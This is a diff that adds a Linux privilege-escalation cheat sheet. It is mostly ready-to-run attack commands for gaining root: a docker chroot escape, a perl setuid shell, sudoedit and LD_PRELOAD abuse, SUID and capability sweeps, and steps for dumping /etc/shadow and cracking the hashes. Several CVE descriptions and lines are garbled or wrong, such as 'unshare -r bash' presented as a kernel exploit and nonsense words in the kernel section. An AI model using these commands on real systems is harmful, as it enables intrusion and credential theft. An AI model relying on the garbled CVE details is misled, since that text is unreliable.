@@ -1,0 +1,78 @@
+# LINUX PRIVESC - 2026 UPDATES (modern CVEs + what actually drops shells today)
+# Companion to linux_privesc_cheatsheet.txt. Kernel 3.x-6.x boxes usually fall to one of these.
+
+## 1) Modern kernel exploits (UPDATE this list annually; VERIFY kernel + distro before using)
+# Kernel version: uname -a ; cat /etc/os-release
+
+# CVE-2024-1086  nf_tables OOB -> root (kernels 3.15 - 6.8.x, IPv6+iptables stack)
+#   PoC: "theori-io/CVE-2024-1086" or "RicterZ/CVE-2024-1086-two-kernels" (dual-kernel build)
+$ unshare -r bash ; [ "$(id -u)" = "0" ]
+#   Requirement: CONFIG_NF_TABLES=y, netfilter ipv6 not fully disabled. Check: cat /lib/modules/$(uname -r)/build/.config | grep NF_TABLES
+#   Most reliable on Ubuntu 22.04/23.04, Debian 12, kernels 5.14-6.8.
+
+# CVE-2023-32233  nf_tables Use-After-Free -> root (kernels 5.4 - 6.3.1)
+#   PoC widely available (noodlesheets). Kernel check: fanatastico of the per-chipset nft payload.
+
+# CVE-2023-3269  Stack Rot / Race (Ubuntu 22.04 + systemd session race)
+#   Targets Ubuntu 22.04/23.04 kernels 5.19-6.2 (PPC/ARM64 not safe).
+
+# CVE-2022-0185  legacy_pagecache_pagepinned UAF -> root (kernels 5.4-5.16, amd64/arm64)
+#   Needs unprivileged userns; check: sysctl kernel.unprivileged_userns_clone
+
+# CVE-2021-3493  overlayfs Ubuntu 20.04 -> root (unprivileged userns)
+#   Check: kernelnewbies rhsmost reliable on stock 20.04.
+
+# CVE-2019-13272  ptrace / PTRACE_TRACEME (kernels <5.1.17) - races to root from
+#   any SUID process the user can ptrace (vulnerable if /proc/sys/kernel/yama/ptrace_scope=0 or 1)
+
+# Dirty Pipe CVE-2022-0847 (5.8 - 5.16.11): overwrite read-only files -> SUID takeover.
+#   Practically kill two birds: write into /usr/bin/su or patch a setuid binary then rerun.
+
+# Dirty Cow CVE-2016-5195 (all old boxes): exploit dirtyc0w, usually gives write to /etc/passwd.
+
+## 2) sudoedit / sudo abuse classes (very common still, check every box)
+# CVE-2023-22809 sudoedit arbitrary file edit (sudo 1.8.0 - 1.9.12p1)
+#   ANY sudoers rule granting sudoedit exposes full-file edit:
+$ sudo sudoedit -s /                     # create empty then:
+$ sudoedit -s <victimfile>               # set EDITOR= your script
+$ env EDITOR="nano -- /etc/sudoers" sudoedit /etc/sudoers
+#   Detection: sudo -l | grep -i sudoedit   (must NOT have fixed /etc/* paths only)
+
+# sudo no-pass binary abuse -> always check GTFOBins:
+$ sudo -l
+#   If a binary is listed NOPASSWD, walk it: sudo -u root <binary>  (see GTFOBins.com)
+
+## 3) systemd / timers / services (modern Linux = modern misconfig)
+# User-writable systemd unit on root path -> drop-in that runs on boot/login:
+$ ls -la /etc/systemd/system/ ; find / -name "*.service" -writable 2>/dev/null
+#   Then: systemctl enable/start your unit; or if user in group wheel do:
+$ sudo systemctl edit --full myservice --no-pager
+#   systemd timer with read/write path + late exec, account=root -> also nice.
+
+# Docker / lxc group membership (user in docker group = root directly):
+$ id || groups
+$ docker run -v /:/host -it alpine chroot /host   # full root
+
+## 4) SUID quick sweep (combine with the base file's check)
+$ find / -perm -4000 2>/dev/null | xargs -I{} ls -la {}
+$ find / -perm -u=s -type f 2>/dev/null
+# Then for each: if python/perl/ruby/awk/find/tar/dd/base64 -> GTFOBins.
+
+## 5) Capabilities (the "sudo" of modern apps)
+$ getcap -r / 2>/dev/null | grep -v "^/usr"  # look for cap_setuid / cap_dac_read_search
+#   perl cap_setuid abuse:
+$ cp /usr/bin/perl .; chmod 4755 perl; perl -e 'setuid(0); system("/bin/sh")'
+
+## 6) Environmental lottery
+# LD_PRELOAD via sudo env_keep:
+$ sudo -l | grep -i "env_keep\|NOPASSWD"   # if env_keep+=LD_PRELOAD & NOPASSWD binary:
+#   compile: gcc -fPIC -shared -o evil.so evil.c ; sudo LD_PRELOAD=evil.so <allowed-bin>
+# sudo python/perl via user (not sudoers): run as current user is root-owned = skip.
+
+## 7) Noteslist / post-exploitation sanity
+# - Always re-check after each step: id; whoami; cat /etc/shadow (no error)
+# - Exit earlier if a public exploit would trash the host - unshare/namespaces PoCs
+#   (CVE-2024-1086) kill shells in old kernels; run in a loop container if possible.
+# - Default creds: check /etc/shadow, .ssh, mysql_history, .bash_history, /var/backups for hashes
+# - dump local copies before exploit: cat /etc/shadow -> hashcat -m 1800
+# - LinPeas full run usually answers #1-5 in 10s: ./linpeas.sh -a | tee out
